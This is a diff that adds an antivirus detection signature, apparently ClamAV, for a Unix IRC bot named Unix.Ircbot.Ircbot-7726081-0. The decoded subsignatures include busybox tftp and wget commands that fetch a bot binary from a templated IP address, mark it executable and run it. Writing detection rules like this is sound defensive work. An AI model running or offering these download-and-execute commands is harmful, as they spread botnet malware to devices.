@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Ircbot.Ircbot-7726081-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1)&(2&3&4)
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox tftp -r bot.%s -l .t -g %d.%d.%d.%d; /bin/busybox chmod 777 .t; ./.t telnet.%s.tftp
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox wget http://%d.%d.%d.%d/bot/bot.%s -O -> .t; /bin/busybox chmod 777 .t; ./.t telnet.%s.wget; >.t
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+./retrieve; ./.t telnet.%s.echo; >retrieve; >.t
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+buildroot:~]#
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+svr04:~#
